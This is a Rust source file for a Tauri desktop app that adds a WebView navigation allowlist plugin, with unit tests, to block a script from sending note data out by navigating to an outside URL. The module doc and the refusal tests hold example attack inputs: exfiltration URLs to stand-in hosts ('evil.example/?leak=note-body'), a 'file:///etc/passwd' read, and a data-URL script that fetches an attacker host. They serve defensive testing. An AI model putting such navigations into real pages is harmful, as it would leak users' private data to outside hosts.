// SPDX-License-Identifier: AGPL-3.0
//! App-global WebView navigation policy (myne#383).
//!
//! **The one exfiltration channel the CSP cannot see.** `connect-src` governs
//! `fetch`; nothing governs `location = "https://evil/?d=" + noteBody`. The
//! `navigate-to` directive was dropped from the CSP spec and shipped in no
//! engine, and `form-action` — which *is* a navigation directive — has no
//! `default-src` fallback, so a policy that omits it does not get one. The
//! `tauri.conf.json` CSP now carries `form-action 'none'` for the form case;
//! this module is the missing directive for the scripted case.
//!
//! Its precondition is a residual `agent-tooling/docs/threat-model.md` §7 already accepts —
//! script running in the WebView after a DOMPurify bypass (`:167` embedded
//! HTML, `:168` importer markup, `:169` mermaid). It contains nothing else
//! about such a script: every vault command the ACL grants stays reachable.
//! What it removes is the *outbound* half those three bullets each assume is
//! closed when they say a bypass "could not exfiltrate".
//!
//! **Why a plugin and not a builder call.** `tauri::Builder` has no
//! `on_navigation`; `WebviewBuilder::on_navigation` exists but is unreachable
//! for the `main` window, which is materialised from `tauri.conf.json`
//! `app.windows[0]` and never passes through a Rust builder. The plugin hook
//! (`tauri::plugin::Builder::on_navigation`) is the only surface that reaches
//! a config-declared window: the manager wraps EVERY pending webview with it,
//! so one registration covers `main` and the hidden `pdf-export` render window
//! alike, and the store fans out AND-style — any plugin returning `false`
//! cancels. No ACL is consulted on this path, and this plugin registers no
//! commands, so it needs no `build.rs` `InlinedPlugin` arm, no
//! `permissions/` directory and no `capabilities/` entry (the
//! `tauri-plugin-single-instance` shape).
//!
//! **Platform reach, stated rather than implied.** WKWebView
//! (`decidePolicyForNavigationAction`) and WebKitGTK (`connect_decide_policy`)
//! deliver sub-frame navigations to this hook as well as top-level ones.
//! WebView2 (`add_NavigationStarting`) delivers only the top frame — wry does
//! not wire `add_FrameNavigationStarting` — so on Windows a sub-frame
//! navigation is bounded by the CSP's `frame-src` alone. That is why the
//! allowlist below admits `attachment:`: on the two platforms that *do* report
//! sub-frames, refusing it would break attachment previews the CSP explicitly
//! permits.
//!
//! **Dev has no CSP at all.** In `pnpm tauri dev` the frontend is served by
//! Vite rather than the `tauri://` protocol handler, so the config CSP is
//! never attached to a response. Pre-existing and out of scope here — but it
//! is why this module, which *does* run in dev, is the more valuable half of
//! the change.
//
// see: src-tauri/AGENTS.md "Secret-handling logging discipline"

use tauri::plugin::{Builder, TauriPlugin};
use tauri::{Runtime, Url};

/// Is `url` an origin this app itself loads?
///
/// Allowlist, not a denylist: a URL is admitted only when it matches one of
/// the shapes below, so a scheme nobody has considered fails by non-match
/// rather than by an unmaintained rejection list. Same doctrine as the
/// embedded-HTML sanitizer and the custom-theme value grammar.
///
/// | shape | why |
/// |---|---|
/// | `tauri://localhost` | the production bundle on macOS + Linux |
/// | `http`/`https://tauri.localhost` | the same bundle on Windows + Android, which cannot intercept a custom scheme (the `https` twin is accepted so flipping `app.security.useHttpsScheme` never blanks the app) |
/// | `attachment://…` | the registered decrypted-attachment scheme (`plugins::attachments::scheme`) — see the sub-frame note in the module doc |
/// | `http://attachment.localhost` | its Windows/Android http-mapped form, exactly like the CSP's paired entries |
/// | `http://localhost` / `http://127.0.0.1`, **dev builds only** | the Vite dev server (`build.devUrl`) |
///
/// Everything else is refused, including three that look like they might
/// belong and do not: `myne:` (a deep link arrives through the OS and the
/// single-instance argv handoff, never as a webview navigation), `ipc:` /
/// `http://ipc.localhost` (IPC is `fetch`, governed by `connect-src`), and
/// `blob:` (a blob URL is loaded as a sub-resource; nothing in the app
/// navigates to one).
///
/// The host comparison is `==`, never `contains` / `ends_with`, so
/// `tauri.localhost.evil.example` fails.
pub fn is_allowed_navigation(url: &Url) -> bool {
    match url.scheme() {
        // The PORT is part of an origin (RFC 6454), and leaving it unconstrained
        // meant `tauri://localhost:9999/` and `https://tauri.localhost:4443/?d=<note>`
        // were admitted while the doc above and `threat-model.md` §7 both said
        // "the app's own origins". On Android the app is served on port 80 and
        // wry's asset interception is keyed on the request URL, so a non-80
        // `tauri.localhost` URL is the one admitted shape whose resolution the
        // platform resolver decides rather than this policy: a query string on
        // it is exactly the channel this module exists to close.
        "tauri" => url.host_str() == Some("localhost") && url.port().is_none(),
        "attachment" => true,
        "http" | "https" => match url.host_str() {
            Some("tauri.localhost") | Some("attachment.localhost") => {
                url.port_or_known_default() == Some(if url.scheme() == "https" { 443 } else { 80 })
            }
            // The dev server is plain http and exists only in a dev build.
            // The port is deliberately not pinned: `strictPort` keeps Vite on
            // 1420, but `TAURI_DEV_HOST` and any future `devUrl` edit would
            // otherwise produce a blank dev window with no diagnosable cause.
            Some("localhost") | Some("127.0.0.1") => cfg!(dev) && url.scheme() == "http",
            _ => false,
        },
        _ => false,
    }
}

/// A closed-enum label for a refused URL's scheme.
///
/// The refused URL itself is never logged: it is the single value most likely
/// to carry note plaintext, a title, or an account number in its query string
/// — which is the whole point of refusing it. A URL scheme is a bounded token
/// by grammar, but "bounded" is not "closed", so it is mapped here for the
/// same reason `io_failure_kind` exists.
fn denied_scheme_label(url: &Url) -> &'static str {
    match url.scheme() {
        "http" => "http",
        "https" => "https",
        "file" => "file",
        "data" => "data",
        "blob" => "blob",
        "javascript" => "javascript",
        "about" => "about",
        "tauri" => "tauri",
        "attachment" => "attachment",
        "myne" => "myne",
        _ => "other",
    }
}

/// Construct the navigation-policy plugin.
///
/// Registers no commands and manages no state — it exists only to install the
/// `on_navigation` hook (see the module doc for why that is the only mechanism
/// available to a config-declared window).
pub fn init<R: Runtime>() -> TauriPlugin<R> {
    Builder::<R>::new("navigation-policy")
        .on_navigation(|webview, url| {
            if is_allowed_navigation(url) {
                return true;
            }
            tracing::warn!(
                stage = "navigation_denied",
                scheme = denied_scheme_label(url),
                webview = webview.label(),
                "webview navigation refused by policy"
            );
            false
        })
        .build()
}

#[cfg(test)]
mod tests {
    use super::is_allowed_navigation;
    use tauri::Url;

    fn allowed(raw: &str) -> bool {
        is_allowed_navigation(&Url::parse(raw).expect(raw))
    }

    #[test]
    fn admits_the_apps_own_origins() {
        for raw in [
            // Production, macOS + Linux.
            "tauri://localhost/index.html",
            // The hidden pdf-export render window loads through the same
            // origin (`WebviewUrl::App` resolves against it), so it needs no
            // arm of its own.
            "tauri://localhost/pdf-export.html",
            // Production, Windows + Android — and the https twin, so flipping
            // `useHttpsScheme` is not a silent blank-window change.
            "http://tauri.localhost/index.html",
            "https://tauri.localhost/index.html",
            // Decrypted attachments: the custom scheme and its http-mapped
            // form, matching the CSP's paired `frame-src` entries.
            "attachment://0123456789abcdef/",
            "http://attachment.localhost/0123456789abcdef",
        ] {
            assert!(allowed(raw), "should be allowed: {raw}");
        }
    }

    #[test]
    fn refuses_the_exfiltration_channel_csp_cannot_see() {
        for raw in [
            // The case this module exists for: a query string is a channel.
            "https://evil.example/?leak=note-body",
            "http://evil.example/",
            // Host comparison must be equality — these all pass a `contains`
            // or `ends_with` check and must still fail.
            "http://tauri.localhost.evil.example/",
            "https://attachment.localhost.evil.example/",
            "tauri://evil/",
            "tauri://localhost.evil.example/",
            // Local reads and inline documents.
            "file:///etc/passwd",
            "data:text/html,<script>fetch('https://evil')</script>",
            "blob:tauri://localhost/6b1c2f4e",
            "javascript:alert(1)",
            // Deep links arrive through the OS + the single-instance argv
            // handoff, never as a navigation.
            "myne://theme/install?p=eyJ9",
            // IPC is fetch, governed by connect-src.
            "ipc://localhost/plugin:notes%7Cnote_read",
            "http://ipc.localhost/plugin:notes%7Cnote_read",
        ] {
            assert!(!allowed(raw), "should be refused: {raw}");
        }
    }

    #[test]
    #[cfg(dev)]
    fn admits_the_vite_dev_server_in_a_dev_build() {
        assert!(allowed("http://localhost:1420/"));
        assert!(allowed("http://127.0.0.1:1420/"));
        // Still http-only: the dev server does not serve TLS, so an https
        // localhost URL is somebody else's listener.
        assert!(!allowed("https://localhost:1420/"));
    }

    #[test]
    #[cfg(not(dev))]
    fn refuses_the_vite_dev_server_in_a_release_build() {
        assert!(!allowed("http://localhost:1420/"));
        assert!(!allowed("http://127.0.0.1:1420/"));
    }
}
